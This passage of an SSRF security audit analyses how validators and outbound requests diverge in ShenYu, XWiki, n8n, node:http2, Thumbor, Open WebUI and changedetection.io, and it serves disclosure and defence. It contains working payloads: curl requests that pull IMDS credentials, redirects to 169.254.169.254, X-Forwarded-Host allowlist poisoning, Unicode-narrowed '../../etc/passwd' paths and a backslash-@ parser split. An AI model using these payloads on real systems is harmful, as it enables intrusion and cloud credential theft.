+<span class="line"><span style="color:#FFA657">$</span><span style="color:#A5D6FF"> curl</span><span style="color:#A5D6FF"> http://</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#A5D6FF">g</span><span style="color:#E6EDF3">w</span><span style="color:#FF7B72">></span><span style="color:#A5D6FF">/latest/meta-data/instance-id</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">       -H</span><span style="color:#A5D6FF"> 'specify-domain: 169.254.169.254'</span></span>
+<span class="line"><span style="color:#FFA657">i-06048838416bd5003</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FFA657">$</span><span style="color:#A5D6FF"> curl</span><span style="color:#A5D6FF"> http://</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#A5D6FF">g</span><span style="color:#E6EDF3">w</span><span style="color:#FF7B72">></span><span style="color:#A5D6FF">/latest/meta-data/iam/security-credentials/</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#A5D6FF">rol</span><span style="color:#E6EDF3">e</span><span style="color:#FF7B72">></span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">       -H</span><span style="color:#A5D6FF"> 'specify-domain: 169.254.169.254'</span></span>
+<span class="line"><span style="color:#E6EDF3">{</span></span>
+<span class="line"><span style="color:#FFA657">  "Code"</span><span style="color:#A5D6FF"> :</span><span style="color:#A5D6FF"> "Success",</span></span>
+<span class="line"><span style="color:#FFA657">  "AccessKeyId"</span><span style="color:#A5D6FF"> :</span><span style="color:#A5D6FF"> "ASIA................",</span></span>
+<span class="line"><span style="color:#FFA657">  "SecretAccessKey"</span><span style="color:#A5D6FF"> :</span><span style="color:#A5D6FF"> "....redacted....",</span></span>
+<span class="line"><span style="color:#FFA657">  "Token"</span><span style="color:#A5D6FF"> :</span><span style="color:#A5D6FF"> "....redacted....",</span></span>
+<span class="line"><span style="color:#FFA657">  "Expiration"</span><span style="color:#A5D6FF"> :</span><span style="color:#A5D6FF"> "2026-06-10T14:15:41Z"</span></span>
+<span class="line"><span style="color:#E6EDF3">}</span></span></code></pre>
+<p>The control proves the gateway does not itself expose IMDS. Adding the
+header changes the upstream and returns live STS credentials without
+authentication to the
+caller. The IMDS test was against an IMDSv1-reachable instance. A plain
+GET SSRF cannot perform the IMDSv2 token handshake, so an IMDSv2-only
+instance closes the metadata path, but RFC 1918, RFC 6598, and internal
+<code>host:port</code> reach is unaffected. The local differential is the structural
+proof: a route configured only for <code>legit-upstream:8080</code> received only the
+baseline request. The <code>internal-victim</code> container had no published port, was
+reachable only on the internal network, and appeared in no route. It
+logged <code>GET /proxy/ping Host=internal-victim</code> and returned its body to the
+client, the two requests differing solely by the header.</p>
+<p>The ShenYu defect is direct: request data overwrites the selected upstream
+after routing, and the new authority is fetched without another policy
+check. This is <code>P</code> evidence at response-body depth. F8 does not appear in the
+§10 matrix because that matrix records cross-library disagreements, while
+this result depends on an application object lifecycle.</p>
+<h2 id="the-checked-request-is-not-the-emitted-request">The checked request is not the emitted request</h2>
+<p>The socket target is only one identity. HTTP/1 adds <code>Host</code>. HTTP/2 adds
+<code>:authority</code>, <code>:scheme</code>, and <code>:path</code> as independent fields. HTTPS can add SNI
+and a certificate reference name. A guard can approve the dial and still
+lose the request at emission.</p>
+<h3 id="trust-state-and-host-state">Trust state and Host state</h3>
+<p>XWiki is the stranger case, so it goes first. Its forwarded-host input does
+not become the outbound <code>Host</code>. It writes the validator’s allowlist before
+that same validator reads it.</p>
+<p><code>DefaultURLSecurityManager.java:143-173</code>:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="java"><code><span class="line"><span style="color:#FF7B72">public</span><span style="color:#FF7B72"> boolean</span><span style="color:#D2A8FF"> isDomainTrusted</span><span style="color:#E6EDF3">(URL urlToCheck) {</span></span>
+<span class="line"><span style="color:#FF7B72">    if</span><span style="color:#E6EDF3"> (</span><span style="color:#79C0FF">this</span><span style="color:#E6EDF3">.urlConfiguration.</span><span style="color:#D2A8FF">isTrustedDomainsEnabled</span><span style="color:#E6EDF3">()) {</span></span>
+<span class="line"><span style="color:#D2A8FF">        maybeInitializeWithDomain</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">this</span><span style="color:#E6EDF3">.</span><span style="color:#D2A8FF">getCurrentDomain</span><span style="color:#E6EDF3">());  </span><span style="color:#8B949E">// writes</span></span>
+<span class="line"><span style="color:#E6EDF3">        String</span><span style="color:#E6EDF3"> host</span><span style="color:#FF7B72"> =</span><span style="color:#E6EDF3"> urlToCheck.</span><span style="color:#D2A8FF">getHost</span><span style="color:#E6EDF3">();</span></span>
+<span class="line"><span style="color:#FF7B72">        do</span><span style="color:#E6EDF3"> {</span></span>
+<span class="line"><span style="color:#FF7B72">            if</span><span style="color:#E6EDF3"> (trustedDomains.</span><span style="color:#D2A8FF">contains</span><span style="color:#E6EDF3">(host)) {              </span><span style="color:#8B949E">// reads</span></span>
+<span class="line"><span style="color:#FF7B72">                return</span><span style="color:#79C0FF"> true</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#E6EDF3">            } ...</span></span></code></pre>
+<p><code>getCurrentDomain()</code> trusts <code>Forwarded</code> and <code>X-Forwarded-Host</code> without
+checking that the sender is a trusted proxy:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>String forwarded = request.getHeader(HEADER_FORWARDED);</span></span>
+<span class="line"><span>if (StringUtils.isNotEmpty(forwarded)) {</span></span>
+<span class="line"><span>    ForwardedHeader h = new ForwardedHeader(forwarded);</span></span>
+<span class="line"><span>    if (h.getHost() != null) {</span></span>
+<span class="line"><span>        builder.append(h.getHost());</span></span>
+<span class="line"><span>        return;</span></span>
+<span class="line"><span>    }</span></span>
+<span class="line"><span>}</span></span>
+<span class="line"><span>String proxyHost = getFirstHeaderValue(request, HEADER_X_FORWARDED_HOST);</span></span>
+<span class="line"><span>if (proxyHost != null) {</span></span>
+<span class="line"><span>    builder.append(proxyHost);</span></span>
+<span class="line"><span>    return;</span></span>
+<span class="line"><span>}</span></span></code></pre>
+<p>One request can therefore add <code>H</code> and ask whether <code>http://H/...</code> is trusted.
+The set is process-wide and survives until restart. On
+<code>xwiki:18.3.0-postgres-tomcat</code>, the same URL changed from blocked to redirect
+with one header:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>GET /bin/redirect/Main/WebHome?xredirect=http://attacker.example/phish</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>no header:</span></span>
+<span class="line"><span>  HTTP/1.1 200</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>X-Forwarded-Host: attacker.example</span></span>
+<span class="line"><span>  HTTP/1.1 302</span></span>
+<span class="line"><span>  Location: http://attacker.example/phish</span></span></code></pre>
+<p>An unpoisoned hostname remained blocked. The write is selective, not a
+global guard disable.</p>
+<p>The HTML-diff image downloader turns the same trust write into SSRF. A
+low-privilege editor puts internal images in two revisions and requests the
+diff with <code>X-Forwarded-Host: internal-svc</code>:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>INTERNAL-SVC HIT: GET /img-v1.png  Host=internal-svc:8000</span></span>
+<span class="line"><span>INTERNAL-SVC HIT: GET /img-v2.png  Host=internal-svc:8000</span></span></code></pre>
+<p>The bytes are buffered but not returned by the diff, so this sink is blind.
+Proof: <code>P</code>; unauthenticated response-depth open redirect, authenticated
+HTTP-request-depth SSRF. This is <code>state-poison</code>, not F6.</p>
+<p>n8n is the direct F6 shape. With
+<code>N8N_SSRF_PROTECTION_ENABLED=true</code>, its HTTP Request node resolves, checks,
+pins, and revalidates redirects. The flag defaults off. The V3 node also
+accepts arbitrary headers, and <code>parseRequestObject</code> copies them into axios:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>axiosConfig.headers = requestObject.headers as AxiosHeaders;</span></span></code></pre>
+<p>Axios passes a custom <code>host</code> into <code>node:http</code>, which emits it instead of the
+URL authority. On the shipped n8n image (CLI 2.21.7):</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>validated URL / dial: 172.31.0.20:9999</span></span>
+<span class="line"><span>wire Host:           evil.internal.k8s.svc</span></span>
+<span class="line"><span>execution:           success</span></span></code></pre>
+<p>Removing the lab allowlist entry made the same workflow fail at the SSRF
+guard. The proof is the split, not an internal backend: the TCP connection
+still lands on the approved IP. Exploitation needs an ingress, ALB, nginx
+vhost, or service mesh there that routes by <code>Host</code>. Proof: <code>P</code>,
+HTTP-request depth, logged-in workflow author, guard enabled.</p>
+<h3 id="f7-no-guarded-product-in-this-audit">F7, no guarded product in this audit</h3>
+<p>RFC 9113 §8.3.1 [3] is not ambiguous: a direct H/2 client must use
+<code>:authority</code>, must not send a differing <code>Host</code>, and a server should reject
+the mismatch. The seam is an API, not permission from the RFC. Netty,
+<code>node:http2</code>, nghttp2, Swift NIO, Haskell <code>http2</code>, and BEAM can accept
+pseudo-fields separately from a URL object; valid alternate authority or
+path bytes reach the wire.</p>
+<p>The product hunt required one process to expose a destination allowlist,
+attacker control of a direct <code>:authority</code> or <code>:path</code>, and no field check.
+SonarQube, NiFi InvokeHTTP, Keycloak CIMD, and Spring Cloud Gateway did not
+assemble those conditions. Apache HttpClient’s <code>setAuthority()</code> moves
+routing and wire together. JDK <code>HttpClient</code> restricts <code>Host</code> by default.
+F7 is a cross-stack primitive with no guarded product finding in this audit.</p>
+<h3 id="f9-unicode-in-ascii-on-the-wire">F9, Unicode in; ASCII on the wire</h3>
+<p>A caller validates a JavaScript string; <code>node:http2</code> serializes a different
+byte string. In <code>src/node_http_common-inl.h:42</code> (Node v26.1.0),
+<code>NgHeaders&#x3C;T>::NgHeaders</code> writes the assembled name/value blob as LATIN1:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>StringBytes::Write(env->isolate(),</span></span>
+<span class="line"><span>                   header_contents,</span></span>
+<span class="line"><span>                   header_string_len,</span></span>
+<span class="line"><span>                   header_string.As&#x3C;v8::String>(),</span></span>
+<span class="line"><span>                   LATIN1);</span></span></code></pre>
+<p>LATIN1 keeps the low byte of each UTF-16 code unit. U+0100 narrows to NUL
+and is rejected. Accepted codepoints above it can manufacture ASCII:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>U+0140 ŀ -> 40 @       U+012F į -> 2f /</span></span>
+<span class="line"><span>U+013F Ŀ -> 3f ?       U+015C Ŝ -> 5c \</span></span>
+<span class="line"><span>U+013A ĺ -> 3a :</span></span></code></pre>
+<p>Letters work too:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>ť U+0165 -> 65 e       Ŷ U+0176 -> 76 v</span></span>
+<span class="line"><span>ũ U+0169 -> 69 i       Ŭ U+016C -> 6c l</span></span></code></pre>
+<p>The validator sees <code>ťŶũŬ.com</code>. The peer sees <code>evil.com</code>. Captured after
+HPACK decode:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="http"><code><span class="line"><span style="color:#7EE787">JS</span><span style="color:#FF7B72"> :</span><span style="color:#A5D6FF">authority = "ťŶũŬ.com"</span></span>
+<span class="line"><span style="color:#E6EDF3">wire authority = "evil.com"              hex 6576696c2e636f6d</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#7EE787">JS</span><span style="color:#FF7B72"> :</span><span style="color:#A5D6FF">path = "/api/public/dataĿadmin=true"</span></span>
+<span class="line"><span style="color:#E6EDF3">wire path = "/api/public/data?admin=true"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#7EE787">JS</span><span style="color:#FF7B72"> :</span><span style="color:#A5D6FF">path = "/uploads/photoį..į..įetcįpasswd"</span></span>
+<span class="line"><span style="color:#E6EDF3">wire path = "/uploads/photo/../../etc/passwd"</span></span></code></pre>
+<p>A codepoint-level allowlist can therefore approve an authority, query, or
+path whose ASCII delimiters do not exist until serialization. The narrowing
+covers field values and <code>:path</code>, not the body.</p>
+<p>Node’s HTTP/1 client rejects the same inputs with
+<code>ERR_UNESCAPED_CHARACTERS</code> or its invalid-header guard. Those checks were
+added for CVE-2018-12116 [13]. No equivalent check was present in the four
+H/2 releases tested. The matrix was 4 releases (v20, v22, v24, v26.1.0) × 2
+transports (TLS H/2, h2c) × 4 demos: all 32 trials produced the same wire
+bytes. The defect site dates to the module’s 2017 release.</p>
+<p>Proof: <code>L</code>, HTTP-request depth. No audited product carried untrusted Unicode
+through a meaningful validator into direct <code>node:http2</code> fields. Wrappers
+stripped, encoded, constrained, or signed it;
+SigV4 in particular makes the altered request fail authentication. axios
+has an adjacent deletion mismatch—it removes U+0100+ instead of narrowing—
+but no product chain was found in the audited paths. The primitive is the
+result; a product scalp is not invented for it.</p>
+<h2 id="redirects-escape-the-original-verdict-f5b">Redirects escape the original verdict: F5b</h2>
+<p>RFC 9110 §15.4 defines redirect status codes and the <code>Location</code> field. A
+client may follow a redirect automatically; it is not required to. If it
+follows, it sends a request to the new target. The RFC does not cause an
+application’s SSRF validator to run again. The bug appears when the deployed
+client follows URL1 after the application checked only URL0.</p>
+<p>Thumbor proves this through a configured source allowlist. Open WebUI proves
+it in the opt-in Playwright loader at component level. Their prerequisites
+and proof depth differ.</p>
+<h3 id="thumbor-the-allowlist-that-checks-one-hop">Thumbor: the allowlist that checks one hop</h3>
+<p>Operators stand Thumbor on the public web and set <code>ALLOWED_SOURCES</code>
+to restrict which upstream image hosts it will fetch, then route
+transforms through URLs like <code>/unsafe/200x200/example.cdn/cat.png</code>.
+The host is matched against the allowlist regex exactly once, in
+<code>thumbor/loaders/http_loader.py:49-71</code>:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#FF7B72">def</span><span style="color:#D2A8FF"> validate</span><span style="color:#E6EDF3">(context, url, normalize_url_func</span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3">_normalize_url):</span></span>
+<span class="line"><span style="color:#E6EDF3">    url </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> normalize_url_func(url)</span></span>
+<span class="line"><span style="color:#E6EDF3">    res </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> urlparse(url)</span></span>
+<span class="line"><span style="color:#FF7B72">    if</span><span style="color:#FF7B72"> not</span><span style="color:#E6EDF3"> res.hostname:</span></span>
+<span class="line"><span style="color:#FF7B72">        return</span><span style="color:#79C0FF"> False</span></span>
+<span class="line"><span style="color:#FF7B72">    if</span><span style="color:#FF7B72"> not</span><span style="color:#E6EDF3"> context.config.</span><span style="color:#79C0FF">ALLOWED_SOURCES</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#FF7B72">        return</span><span style="color:#79C0FF"> True</span></span>
+<span class="line"><span style="color:#FF7B72">    for</span><span style="color:#E6EDF3"> pattern </span><span style="color:#FF7B72">in</span><span style="color:#E6EDF3"> context.config.</span><span style="color:#79C0FF">ALLOWED_SOURCES</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#FF7B72">        if</span><span style="color:#79C0FF"> isinstance</span><span style="color:#E6EDF3">(pattern, Pattern):</span></span>
+<span class="line"><span style="color:#E6EDF3">            match </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> url</span></span>
+<span class="line"><span style="color:#FF7B72">        else</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#E6EDF3">            pattern </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> f</span><span style="color:#A5D6FF">"^</span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">pattern</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">$"</span></span>
+<span class="line"><span style="color:#E6EDF3">            match </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> res.hostname</span></span>
+<span class="line"><span style="color:#FF7B72">        if</span><span style="color:#E6EDF3"> re.match(pattern, match):</span></span>
+<span class="line"><span style="color:#FF7B72">            return</span><span style="color:#79C0FF"> True</span></span>
+<span class="line"><span style="color:#FF7B72">    return</span><span style="color:#79C0FF"> False</span></span></code></pre>
+<p>It runs against the submitted URL and returns. The fetch that
+follows builds a Tornado request that chases <code>Location</code> on its own,
+in <code>thumbor/loaders/http_loader.py:178-199</code>:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>req = tornado.httpclient.HTTPRequest(</span></span>
+<span class="line"><span>    url=url,</span></span>
+<span class="line"><span>    headers=headers,</span></span>
+<span class="line"><span>    follow_redirects=context.config.HTTP_LOADER_FOLLOW_REDIRECTS,</span></span>
+<span class="line"><span>    max_redirects=context.config.HTTP_LOADER_MAX_REDIRECTS,</span></span>
+<span class="line"><span>    ...</span></span>
+<span class="line"><span>)</span></span>
+<span class="line"><span>response = await client.fetch(req, raise_error=True)</span></span></code></pre>
+<p><code>HTTP_LOADER_FOLLOW_REDIRECTS</code> defaults to <code>True</code> and
+<code>HTTP_LOADER_MAX_REDIRECTS</code> to <code>5</code> (<code>thumbor/config.py:442-452</code>).
+<code>ALLOWED_SOURCES</code> defaults to an empty list, which allows every source
+directly. A redirect becomes an allowlist bypass only when an operator
+configures a non-empty list. The reproduction uses that documented
+configuration. This is <code>P</code> evidence at response-body depth.
+<code>validate</code> sees the allowlisted host; the client sees an
+<code>HTTPRequest</code> and a <code>Location</code> header, and that is all it sees.
+Both backends follow redirects through different code paths. The default
+<code>SimpleAsyncHTTPClient</code> re-enters its own redirect logic in pure
+Python (<code>tornado/simple_httpclient.py</code> <code>_handle_redirect</code>), and
+<code>CurlAsyncHTTPClient</code> delegates to libcurl with
+<code>CURLOPT_FOLLOWLOCATION=1</code>. Neither has a hook back into the
+allowlist. The attacker needs one host that matches whatever regex
+the operator wrote, and that host answers with a redirect:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>HTTP/1.1 302 Found</span></span>
+<span class="line"><span>Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/</span></span>
+<span class="line"><span>Content-Length: 0</span></span></code></pre>
+<p>On the shipped binary (<code>thumbororg/thumbor:latest</code>, Thumbor 7.7.7,
+Tornado 6.4.2), with <code>ALLOWED_SOURCES = ['attacker\.example']</code> and
+every redirect default left alone, the loader follows the 302 into
+a host the allowlist never approved:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">curl</span><span style="color:#A5D6FF"> /unsafe/200x200/internal.example/secret.png</span><span style="color:#E6EDF3">  -</span><span style="color:#FF7B72">></span><span style="color:#79C0FF"> 400</span><span style="color:#E6EDF3"> (validator </span><span style="color:#A5D6FF">denied</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#FFA657">curl</span><span style="color:#A5D6FF"> /unsafe/200x200/attacker.example/r</span><span style="color:#E6EDF3">           -</span><span style="color:#FF7B72">></span><span style="color:#79C0FF"> 200</span><span style="color:#A5D6FF"> image/png,</span><span style="color:#79C0FF"> 195</span><span style="color:#A5D6FF"> bytes</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">[internal] GET /secret.png  Host</span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF">internal.example</span><span style="color:#E6EDF3">  UA</span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF">Thumbor/7.7.7</span></span></code></pre>
+<p>The internal GET arrives carrying <code>Host: internal.example</code>, not the
+<code>attacker.example</code> the validator approved. Read-capability is gated
+on the engine: when the upstream returns bytes PIL can decode,
+Thumbor resizes them and serves the result back as a normal
+<code>image/png</code>. The 195-byte transform above is the internal PNG
+round-tripped to the caller. Two different redirect targets read
+two distinct avatar paths on the same internal host and return
+distinct md5sums. This proves a path-controlled internal image read, not an
+authorization bypass between tenants.</p>
+<p>The cloud reach is blind. On a real EC2 instance the loader follows a 302
+into <code>169.254.169.254</code>. The redirector log records the initial request and
+fixed <code>Location</code>; the timing and PIL traceback support that the redirected
+fetch completed. PIL refuses the credentials JSON, so Thumbor
+returns HTTP 400 with an empty body. IMDS is reachable; the IAM
+credentials do not leave Thumbor’s process over the HTTP response.
+Against internal hosts the loader still maps the upstream outcome
+to distinct status codes. That provides a service-enumeration and reachability
+oracle even where the body does not return.</p>
+<p>The unauthenticated case is the built-in default: <code>ALLOW_UNSAFE_URL</code>
+is <code>True</code> in Thumbor’s defaults and in the shipped <code>thumbor.conf</code>
+example, so <code>/unsafe/...</code> is reachable with no signature. Signing
+does not close the bug. With <code>ALLOW_UNSAFE_URL=False</code>,
+<code>SECURITY_KEY</code> set, and signed URLs, the redirect-reparse fires
+unchanged because the validator and loader run post-signature;
+the signature covers URL0, not the redirect target URL1. The bound
+worth stating: in a deployment that signs only server-side-templated
+URLs and allowlists no attacker-controllable host, reaching the bug
+needs a separate precondition (an open signing endpoint, an
+allowlist mistake, or a <code>SECURITY_KEY</code> leak).</p>
+<p>Thumbor checks the submitted URL once, then configures Tornado to follow
+redirects. Tornado fetches URL1 without calling Thumbor’s configured
+allowlist again. Automatic following is permitted, not required, by the
+redirect specification.</p>
+<h3 id="open-webui-redirect-inside-the-playwright-loader">Open WebUI: redirect inside the Playwright loader</h3>
+<p>The Open WebUI Playwright loader validates each submitted URL once with
+<code>validate_url</code>, which resolves the host with <code>socket.getaddrinfo</code>
+across both families and rejects any address where
+<code>ipaddress.ip_address(ip).is_global</code> is false, including RFC 1918, loopback,
+and link-local ranges (<code>retrieval/web/utils.py:67-108</code>). The check blocks
+direct private addresses in the resolved set at validation time, but it
+does not pin the later connection. It is also the last time the URL is
+inspected. After it returns <code>True</code>, the URL flows to
+<code>SafePlaywrightURLLoader</code>, which hands
+it to Chromium (<code>retrieval/web/utils.py:455-482</code>):</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#FF7B72">async</span><span style="color:#FF7B72"> with</span><span style="color:#E6EDF3"> async_playwright() </span><span style="color:#FF7B72">as</span><span style="color:#E6EDF3"> p:</span></span>
+<span class="line"><span style="color:#79C0FF">    ...</span></span>
+<span class="line"><span style="color:#FF7B72">    for</span><span style="color:#E6EDF3"> url </span><span style="color:#FF7B72">in</span><span style="color:#79C0FF"> self</span><span style="color:#E6EDF3">.urls:</span></span>
+<span class="line"><span style="color:#FF7B72">        await</span><span style="color:#79C0FF"> self</span><span style="color:#E6EDF3">._safe_process_url(url)</span></span>
+<span class="line"><span style="color:#E6EDF3">        page </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> await</span><span style="color:#E6EDF3"> browser.new_page()</span></span>
+<span class="line"><span style="color:#E6EDF3">        response </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> await</span><span style="color:#E6EDF3"> page.goto(url, </span><span style="color:#FFA657">timeout</span><span style="color:#FF7B72">=</span><span style="color:#79C0FF">self</span><span style="color:#E6EDF3">.playwright_timeout)</span></span>
+<span class="line"><span style="color:#79C0FF">        ...</span></span>
+<span class="line"><span style="color:#E6EDF3">        text </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> await</span><span style="color:#79C0FF"> self</span><span style="color:#E6EDF3">.evaluator.evaluate_async(page, browser, response)</span></span>
+<span class="line"><span style="color:#FF7B72">        yield</span><span style="color:#E6EDF3"> Document(</span><span style="color:#FFA657">page_content</span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3">text, </span><span style="color:#FFA657">metadata</span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3">{</span><span style="color:#A5D6FF">'source'</span><span style="color:#E6EDF3">: url})</span></span></code></pre>
+<p><code>page.goto</code> opens the URL in headless Chromium, and Chromium follows
+the <code>Location</code> header natively. Playwright’s <code>Page.goto</code> exposes no
+parameter to disable redirect-following; the interception point is a
+<code>page.route('**/*', handler)</code> hook the loader does not install. The redirect
+happens inside Chromium, but the application can intercept it through that
+hook.</p>
+<p>This is a sixth shipping component path related to
+GHSA-rh5x-h6pp-cjj6 (CVE-2026-45401) [14]. That advisory closed five
+redirect-reparse paths by adding the <code>AIOHTTP_CLIENT_ALLOW_REDIRECTS</code>
+env flag (default <code>False</code>) and threading it through those
+<code>aiohttp</code>/<code>requests</code> paths. The Playwright loader uses neither client. It
+spawns Chromium and calls <code>page.goto</code>. The existing flag is not wired to this
+loader. Playwright can intercept navigation requests, but this component
+installs no route handler.</p>
+<p>Confirmed against the verbatim <code>SafePlaywrightURLLoader</code> from
+HEAD (<code>3660bc00fd807deced3400a63bfa6db47811a3bb</code>) on the engine’s
+pinned <code>playwright==1.58.0</code> + Chromium stack. The PoC stubs neighboring Open
+WebUI modules and does not drive a request through a running Open WebUI
+server, so this is <code>L</code> evidence at response-body depth. The Playwright
+loader is an opt-in feature:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>[redirector 5.5.5.5] GET /r  Host=attacker.example</span></span>
+<span class="line"><span>[internal 10.5.5.5] GET /secret  Host=internal.example</span></span>
+<span class="line"><span>                                 UA=Mozilla/5.0 (X11; Linux x86_64) ...</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[result] metadata = {'source': 'http://attacker.example/r'}</span></span>
+<span class="line"><span>[result] page_content[:200]: SSRF_PROOF_SECRET  If Chromium reached</span></span>
+<span class="line"><span>  this body, the redirect chain landed on the internal target ...</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>=== SSRF CONFIRMED ===</span></span></code></pre>
+<p>The validator approves <code>attacker.example</code>, which uses an address Python
+classifies as global and the lab aliases locally. Chromium follows the 302 to
+<code>internal.example</code> at private address <code>10.5.5.5</code>, and the body returns in
+<code>Document.page_content</code>. The reflected body is the read channel. The
+returned metadata contains only the submitted source URL, exactly
+<code>{'source': 'http://attacker.example/r'}</code>. It does not expose the final URL.
+The Playwright engine is opt-in (<code>WEB_LOADER_ENGINE=playwright</code>, shipped with a
+dedicated compose file) and the attack requires an authenticated
+user on the RAG ingestion surfaces; the lab redirector stands in
+for an attacker-controlled public host. A component-level fix can abort
+redirected requests through <code>page.route</code>. A complete defense also needs to
+bind accepted resolution to the connection or enforce equivalent network
+egress policy.</p>
+<h2 id="composition">Composition</h2>
+<p>A handoff failure becomes a composition only when it carries a second,
+independent weakness into the request. Two separately working PoCs do not
+count. The combined request must land on the wire through deployed code.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span> [ URL0 passes ]</span></span>
+<span class="line"><span>        |</span></span>
+<span class="line"><span>        v</span></span>
+<span class="line"><span> [ guard returns ]</span></span>
+<span class="line"><span>        |</span></span>
+<span class="line"><span>redirect / re-entry</span></span>
+<span class="line"><span>        |</span></span>
+<span class="line"><span>        v</span></span>
+<span class="line"><span> [ URL1 carries F? ] ---> internal target</span></span></code></pre>
+<p>Order matters. Re-entry can normalize a payload, reset <code>Host</code>, use another
+parser, or rerun part of the guard. Each proposed pair is a fetcher-specific
+measurement, not an algebraic promise.</p>
+<h3 id="a-redirect-as-a-parser-oracle">A redirect as a parser oracle</h3>
+<p>changedetection.io supplies the composed result observed in the tested paths.
+At add time it runs <code>validators.url()</code>. At fetch time and on each redirect
+it runs only <code>urlparse(url).hostname</code>, then hands the string to urllib3. A
+benign URL can therefore pass the full add-time path and later return:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>HTTP/1.1 302 Found</span></span>
+<span class="line"><span>Location: http://10.89.0.50\@example.com/redirect-probe</span></span></code></pre>
+<p>The redirect re-enters after <code>validators.url()</code> has disappeared.
+<code>urlparse</code> reads the host after <code>@</code> and approves <code>example.com</code>. urllib3 ends
+the authority at the backslash and dials <code>10.89.0.50</code>. The private listener
+recorded the request.</p>
+<p>The negative control explains the technique. Replace the literal backslash
+with <code>%5C</code> and the three views agree; the split dies. The redirect is
+therefore a differential oracle for the reduced validation path:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>target              per-hop guard       urllib3          result</span></span>
+<span class="line"><span>----------------------------------------------------------------</span></span>
+<span class="line"><span>10.89.0.50\@...     example.com         10.89.0.50       lands</span></span>
+<span class="line"><span>10.89.0.50%5C@...   same authority      same authority   dies</span></span></code></pre>
+<p>This is <code>P</code> evidence at HTTP-request depth for F1 × F5b. The direct F1 case
+in §4.1 separately proves selected methods, headers, stored bodies, and live
+IMDSv2. That deeper impact is not borrowed for the redirect leg.</p>
+<h3 id="one-chain-no-algebra">One chain, no algebra</h3>
+<p>Among the product paths exercised here, this is the sole composition placed
